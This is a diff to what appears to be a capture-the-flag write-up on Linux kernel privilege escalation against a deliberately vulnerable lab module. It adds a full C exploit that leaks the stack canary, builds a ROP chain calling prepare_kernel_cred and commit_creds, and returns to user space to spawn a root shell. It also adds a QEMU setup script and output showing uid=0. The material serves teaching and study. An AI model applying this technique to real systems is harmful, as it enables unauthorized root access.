@@ -102,13 +102,67 @@ void cleanup_module(void)
 ## Building a Complete Escalation Chain
 ...
 
+```c
+void overflow_buffer(int fd, unsigned long canary)
+{
+    unsigned long payload[20];
+
+    payload[4] = canary;
+    
+    payload[5] = 0xffffffff81001518; // pop rdi; ret
+    payload[6] = 0x00;               // rdi = 0x00
+    payload[7] = 0xffffffff810881c0; // prepare_kernel_cred
+
+    payload[8]  = 0xffffffff81001518; // pop rdi; ret
+    payload[9]  = 0x00;               // rdi = 0x00
+    payload[10] = 0xffffffff8158f72a; // add rdi, rax; cmp rdi, 0x1; setbe al; ret
+    payload[11] = 0xffffffff81087e80; // commit_creds
+
+    payload[12] = 0xffffffff81c00eaa; // swapgs; pop rbp; ret
+    payload[13] = 0x00;               // rbp = 0x00
+
+    payload[14] = 0xffffffff81023cc2; // iretq 
+    payload[15] = (unsigned long)shell;
+    payload[16] = save_cs;
+    payload[17] = save_rf;
+    payload[18] = save_sp;
+    payload[19] = save_ss;
+
+    write(fd, payload, sizeof(unsigned long) * 20);
+}
+```
+
 
 ## Environment Setup
 ...
 
+{{< code language="sh" title="launch.sh" id="1" expand="Show" collapse="Hide" isCollapsed="false" >}}
+#!/bin/bash
+
+# build root fs
+pushd fs
+find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz
+popd
+
+# launch
+/usr/bin/qemu-system-x86_64 \
+    -kernel linux-5.4/arch/x86/boot/bzImage \
+    -initrd $PWD/initramfs.cpio.gz \
+    -fsdev local,security_model=passthrough,id=fsdev0,path=$HOME \
+    -device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \
+    -nographic \
+    -monitor none \
+    -s \
+    -cpu kvm64,+smep,+smap \
+    -append "console=ttyS0 nokaslr nopti quiet"
+{{< /code >}}
+
 
 ## Building the Exploit
 ...
+
+{{< code language="c" title="exploit.c" id="2" expand="Show" collapse="Hide" isCollapsed="true" >}}
+{{< /code >}}
 
 
 ## Fixing the Exploit with a SIGSEGV Handler
@@ -145,6 +199,133 @@ int main(int argc, char **argv)
 ```
 
 ...
+
+```c
+void overflow_buffer(int fd, unsigned long canary)
+{
+    unsigned long payload[20];
+
+    payload[4] = canary;
+    
+    payload[5] = 0xffffffff81001518; // pop rdi; ret
+    payload[6] = 0x00;               // rdi = 0x00
+    payload[7] = 0xffffffff810881c0; // prepare_kernel_cred
+
+    payload[8]  = 0xffffffff81001518; // pop rdi; ret
+    payload[9]  = 0x00;               // rdi = 0x00
+    payload[10] = 0xffffffff8158f72a; // add rdi, rax; cmp rdi, 0x1; setbe al; ret
+    payload[11] = 0xffffffff81087e80; // commit_creds
+
+    payload[12] = 0xffffffff81c00eaa; // swapgs; pop rbp; ret
+    payload[13] = 0x00;               // rbp = 0x00
+
+    payload[14] = 0xffffffff81023cc2; // iretq 
+    payload[15] = 0xdeadbeef;         // rip = 0xdeadbeef (segfault)
+    payload[16] = save_cs;
+    payload[17] = save_rf;
+    payload[18] = save_sp;
+    payload[19] = save_ss;
+
+    write(fd, payload, sizeof(unsigned long) * 20);
+}
+```
+
+...
+
+{{< code language="c" title="exploit.c" id="3" expand="Show" collapse="Hide" isCollapsed="true" >}}
+#include <stdio.h>
+#include <stdlib.h>
+#include <assert.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <signal.h>
+
+unsigned long save_ss, save_sp, save_rf, save_cs;
+
+void signal_handler(int signum)
+{
+    system("/bin/sh");
+}
+
+void save_user_space()
+{
+    /* save user-space */
+    __asm__(
+        ".intel_syntax noprefix;"
+        "mov save_ss, ss;"
+        "mov save_sp, rsp;"
+        "pushf;"
+        "pop save_rf;"
+        "mov save_cs, cs;"
+        ".att_syntax;"
+    ); 
+}
+
+unsigned long leak_canary(int fd)
+{
+    unsigned long leak[5];
+    read(fd, leak, sizeof(unsigned long) * 5);
+    return leak[4];
+}
+
+void overflow_buffer(int fd, unsigned long canary)
+{
+    unsigned long payload[20];
+
+    payload[4] = canary;
+    
+    payload[5] = 0xffffffff81001518; // pop rdi; ret
+    payload[6] = 0x00;               // rdi = 0x00
+    payload[7] = 0xffffffff810881c0; // prepare_kernel_cred
+
+    payload[8]  = 0xffffffff81001518; // pop rdi; ret
+    payload[9]  = 0x00;               // rdi = 0x00
+    payload[10] = 0xffffffff8158f72a; // add rdi, rax; cmp rdi, 0x1; setbe al; ret
+    payload[11] = 0xffffffff81087e80; // commit_creds
+
+    payload[12] = 0xffffffff81c00eaa; // swapgs; pop rbp; ret
+    payload[13] = 0x00;               // rbp = 0x00
+
+    payload[14] = 0xffffffff81023cc2; // iretq 
+    payload[15] = 0xdeadbeef;         // rip = 0xdeadbeef (segfault)
+    payload[16] = save_cs;
+    payload[17] = save_rf;
+    payload[18] = save_sp;
+    payload[19] = save_ss;
+
+    write(fd, payload, sizeof(unsigned long) * 20);
+}
+
+int main(int argc, char **argv)
+{
+    save_user_space();
+
+    /* register signal handler */
+    signal(SIGSEGV, signal_handler);
+
+    int fd = open("/proc/challenge", O_RDWR);
+    assert(fd > 0);
+
+    /* leak stack canary */
+    unsigned long canary = leak_canary(fd);
+    printf("[*] canary @ 0x%lx\n", canary);
+
+    overflow_buffer(fd, canary); 
+
+    return 0;
+}
+{{< /code >}}
+
+...
+
+```
+/ # insmod challenge.ko
+/ # su ctf
+/ $ /home/ctf/exploit
+...
+/ # id
+uid=0(root) gid=0
+```
 
 
 ## Appendix
